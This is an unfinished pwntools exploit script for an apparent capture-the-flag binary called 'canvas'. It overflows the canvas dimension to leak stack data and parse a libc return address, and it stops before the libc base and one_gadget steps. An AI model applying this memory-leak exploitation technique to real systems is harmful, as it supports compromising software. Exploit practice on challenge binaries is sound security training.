#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=canvas.challs.cyberchallenge.it' '--port=9603' canvas_patched
from pwn import *
import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF('canvas_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'canvas.challs.cyberchallenge.it'
port = int(args.PORT or 9603)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

def write_pixel(x, y, value):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'X:', str(x))
    io.sendlineafter(b'Y:', str(y))
    io.sendlineafter(b'):', str(value))
    
io = start()


# Increase canvas dim so when printed it will leak stack
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'dimension:', b'32')

# Leak stack and save the return address (which is pointing to __libc_start_main + 243)
io.sendlineafter(b'>', b'3')
sleep(1)
# Recive garbage
io.recvline()
io.recvline()
io.recv(804)
# Recive ret_add and save as int
_leak_libc = io.recv(48).decode()
leak_libc = ""
for i in range(0, 48, 6):
    leak_libc += _leak_libc[46-i:46-i+2]
leak_libc = int(leak_libc, 16)


# Calculating libc_base in local with gdb and finding one_gadget
# libc_base = 
io.close()
# io.interactive()

